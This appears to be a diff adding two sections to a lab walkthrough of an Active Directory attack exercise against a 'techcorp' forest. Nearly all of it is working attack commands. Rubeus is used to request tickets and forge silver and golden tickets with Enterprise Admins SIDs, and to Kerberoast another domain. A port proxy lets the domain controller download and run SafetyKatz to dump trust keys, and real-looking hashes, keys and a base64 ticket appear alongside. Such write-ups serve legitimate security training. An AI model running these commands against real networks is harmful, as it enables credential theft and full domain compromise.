@@ -978,3 +978,78 @@ Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:tech
 <figure><img src="../.gitbook/assets/immagine (33).png" alt=""><figcaption></figcaption></figure>
 
 Enterprise admin rc4: bc4cf9b751d196c4b6e1a2ba923ef33f
+
+## Flag 39 - From DA to EA with trust key
+
+First we need a DA access to dump the trust key
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+Then copy the Loader on the DC
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
+```
+{% endcode %}
+
+and then use it to launch SafetyKatz and dump the trust key
+
+{% code overflow="wrap" %}
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch exit"
+```
+{% endcode %}
+
+trust key rc4 : _6f9f71933364a163756d51cbcde9b4e1_&#x20;
+
+And now let's forge a ticket with the SID of the enterprise admins group
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args silver /user:Administrator /ldap /service:krbtgt/TECHCORP.LOCAL /rc4:6f9f71933364a163756d51cbcde9b4e1 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (34).png" alt=""><figcaption></figcaption></figure>
+
+and use it to ask for a tgt
+
+<pre data-overflow="wrap"><code><strong>C:\AD\Tools\Rubeus.exe asktgs /service:CIFS/techcorp-dc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt /ticket:doIFyzCCBcegAwIBBaEDAgEWooIEvDCCBLhhggS0MIIEsKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5URUNIQ09SUC5MT0NBTKOCBG0wggRpoAMCARehAwIBA6KCBFsEggRXGdFUp/HivJhWYK2EvJwht4v8w8/7pVzEdTetAX91NVn2X/vjNxO/3Puo6LO//RSYEXaagw8lZKKHyQgfz1SXprWfsDsLAqiMO6fyfjzZTlOOH/7WnPZYSONxMTQVCxgyxlv4G3hSGIPJTGxIt7wgme9Cx9aX4LOlnPTm9U0uKHDQX/aCChXjkgbu7NkLeJ/9KRWhOOdH0ZmPzHISQyB+PW3fMmJT+cY6NNi/eAYbBwpGJ20axom4NMmyE1Vkv++KYYddEc5gtaVVSMrv5YiKzm1gqYx08PRXG0W1dJ9q8Ne5pP6WWGnAmh+1DqQi0VSkGqLv+Tvhf5LPmWeqonBLYxOq18AVaeBmLFt4AfTl9YwvDMYCRWAPzbG9JU8cDtrSVsPkOanqyD+zT5lYhHXZgclN0ZPxQvmSTqALuQzhVO+oBlAbDnSsUfaPUHcq20yKe/yEUY+E+SG1dB67Wo0XaMEaD60mb2jyt9ljYb9rnmJuxwMCWowtTkL6wDYX3rEUFJ896/0Z7/0yra11V9y1nklm1ZVQyaVyXvsiGQ+6HTG1BPUXbkhoCHtQIQ6EGZCaW4krpg25ooQNltolYESTRbQIZ3ZMv6kw65jZqhLWvVO2trfVdVj1RnfZA0bBFb1KJC7Eo/upRCpB7THgMWOERZo/9ckiOQGxqQv2EPiwViD+vFQs/x0gTxIvrHu/ygxSvYZUkSkqElu/jBoBBEPHfuVjn9rIkcgfbNPt4siAss6gQjIKOlFOFOGs84dA+f984DaW8mOCPUlY6BmSLjVR7aoXgHBFobNWIw21da27hBxXsWAyIZTv6zxtwmKA/eKA5ieJA9mEmLZckXXdcii5HUhyYGj7MuJYaSfFl5+niC1OBe9BE/+PrgQQcwr6CpMsSPrDVjWGKTrYP5PUrdVUP8jGY3Ss8ukgLwan83zZpRm0lckYhrdI3tpEZk1JHfOd0pzEq6uDs6VhzrhdO7yFsG1EcWacnmA0GjCer1QN76qtV6GAxO60UkF4wBIIQUqAOvh7LG/HeaUP6b11FLJ6LS1F1dsjK4gcEtfeABXAoRQdfcxK7WX/K8MjHwhL9C43SXAU4MvkDC8tD4O6gwfF3HQmh/SxUyCkC6mOCBDwDRnQ8Z4cKu6Ypzi+X0Xi+AJfOsCaDMfS2eFEvaHcASfW61KIpAgCUzbIu71zA7uXmOP6qwCQd1NpFIirKysoabIlaDMeae+1FoEv3X9NRn/ledU+BaqhqSarIdTfG+PpNRdXIxZ6liE5xaszEHCqsI8oWbWCxNQKxpXBgQOp/jPuhisVFF53XM6GGku/5XXilsOeShqQYX70MNy6hPMPBbC0gTspuHzxSTt5oYBh3ctk4wdcSCyQ5sU9CgGc4vpKPZoR3PogebyHcxCWeurV0rI+1GOi/FO5kVZ3wp56JAUBcQAznAjKXDYjLqQn5Pl4Gw0qja9iZ7UibKYMskRZ/0kjtb8JOajnBKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoBswGaADAgEXoRIEENZWObe+6zSQi8Q7xPt3E9KhExsRVVMuVEVDSENPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjQwNTAzMTM1MzExWqURGA8yMDI0MDUwMzEzNTMxMVqmERgPMjAyNDA1MDMyMzUzMTFapxEYDzIwMjQwNTEwMTM1MzExWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVEVDSENPUlAuTE9DQUw=
+</strong></code></pre>
+
+<figure><img src="../.gitbook/assets/immagine (35).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/immagine (36).png" alt=""><figcaption></figcaption></figure>
+
+## Flag 40 - Kerberoasting on another domain
+
+Launch invishell and us ad-module to find kerberoastable account
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /ptt
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
+```
+{% endcode %}
